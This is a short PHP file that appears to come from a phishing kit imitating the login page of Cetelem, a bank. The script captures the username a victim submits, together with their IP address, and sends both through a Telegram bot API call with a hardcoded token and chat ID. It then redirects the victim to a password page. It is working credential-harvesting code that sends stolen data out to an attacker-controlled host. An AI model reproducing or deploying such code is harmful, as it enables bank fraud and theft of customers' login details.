<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
if(!empty($_POST['user'])){
$message  = "[+]━━━━【🏦 CETELEM / Login 】━━━[+]\n";
$message .= "[🆔 Identifiant]  : ".$_POST['user']."\n";
$message .= "\n";
$message .= "[🔍 IP INFO] : http://www.geoiptool.com/?IP=$ip\n";
$message .= "=====[ Cetelem  INFO]======";
$token = "8942970138:AAGWB2jmCozyKCo1PZX18paXoBFXRPumdm4";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=8933881160&text=" . urlencode($message)."" );
header("Location:./password.php");
}else{
header("Location:./password.php");
}

?>